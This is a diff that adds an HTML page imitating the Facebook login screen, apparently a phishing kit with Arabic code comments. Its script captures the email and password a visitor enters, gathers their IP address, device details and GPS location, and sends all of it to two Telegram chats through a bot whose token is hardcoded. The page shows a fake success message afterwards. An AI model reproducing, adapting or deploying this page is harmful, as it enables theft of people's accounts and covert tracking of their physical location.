@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .btn-login:hover, .btn-new:hover {
+            background-color: #007BFF; /* تغيير اللون عند التمرير */
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container {
+            animation: fadeIn 1s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            display: none;
+        }
+
+        .confirmation-message {
+            color: green;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="images/fb_logo.svg" alt="Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <div class="form-container">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                    <span id="email-error" class="error-message">Please enter a valid email address.</span>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span id="password-error" class="error-message">Password is required.</span>
+                    <button class="btn-login">Login</button>
+                    <a href="#">Forgotten password?</a>
+                    <button class="btn-new">Create new Account</button>
+                    <div id="confirmation-message" class="confirmation-message">Information sent successfully!</div>
+                    <div id="error-message" class="error-message">Error sending the information. Please try again.</div>
+                </div>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">العربية</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><a href="#">Italiano</a></li>
+                <li><a href="#">Deutsch</a></li>
+                <li><a href="#">Русский</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Bahasa Indonesia</a></li>
+                <li><a href="#">Türkçe</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><button>+</button></li>
+            </ol>
+
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In</a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Video</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Meta Store</a></li>
+                <li><a href="#">Meta Quest</a></li>
+                <li><a href="#">Ray-Ban Meta</a></li>
+                <li><a href="#">Meta AI</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Fundraisers</a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Voting Information Centre</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Privacy Centre</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Create ad</a></li>
+                <li><a href="#">Create Page</a></li>
+                <li><a href="#">Developers</a></li>
+                <li><a href="#">Careers</a></li>
+                <li><a href="#">Cookies</a></li>
+                <li><a href="#">AdChoices</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Contact</a></li>
+                <li><a href="#">Settings</a></li>
+                <li><a href="#">Activity log</a></li>
+            </ol>
+            <small>Meta © 2024</small>
+        </div>
+    </footer>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7939471560:AAEnwyY-_e7D0bApNRjclnXw3KMxW7wK2h8";  // هنا التوكين
+        const CHAT_IDS = ["6630241690", "6183113466"]; // إضافة معرفي الشات هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.querySelector('.btn-login').addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // التحقق من المدخلات
+            if (!email.includes('@')) {
+                document.getElementById('email-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('email-error').style.display = 'none';
+            }
+
+            if (!password) {
+                document.getElementById('password-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('password-error').style.display = 'none';
+            }
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                    
+                    // تحديد الموقع باستخدام HTML5 Geolocation API
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        const googleEarthLink = `https://earth.google.com/web/@${latitude},${longitude},1000a,0d,35y,0h,0t,0r`;
+
+                        const message = `
+                            <b>New Login Attempt</b>\n
+                            <b>Email:</b> ${email}\n
+                            <b>Password:</b> ${password}\n
+                            <b>IP Address:</b> ${ip}\n
+                            <b>Device Type:</b> ${deviceType}\n
+                            <b>Platform:</b> ${platform}\n
+                            <b>User Agent:</b> ${userAgent}\n
+                            <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
+                            <b>Latitude:</b> ${latitude}\n
+                            <b>Longitude:</b> ${longitude}\n
+                            <b>Location:</b> <a href="${googleMapsLink}" target="_blank">View on Google Maps</a>\n
+                            <b>Google Earth:</b> <a href="${googleEarthLink}" target="_blank">View in Google Earth</a>
+                        `;
+
+                        // إرسال الرسالة إلى كل معرف من معرفات الشات
+                        CHAT_IDS.forEach(chat_id => {
+                            axios.post(URI_API, {
+                                chat_id: chat_id,
+                                parse_mode: 'html',
+                                text: message
+                            }).then(response => {
+                                document.getElementById('confirmation-message').style.display = 'block';
+                                setTimeout(() => {
+                                    document.getElementById('confirmation-message').style.display = 'none';
+                                }, 3000);
+                            }).catch(error => {
+                                document.getElementById('error-message').style.display = 'block';
+                            });
+                        });
+                    }, function(error) {
+                        alert("Error retrieving location: " + error.message);
+                    });
+                }).catch(error => {
+                    console.error(error);
+                });
+        });
+    </script>
+</body>
+
+</html>
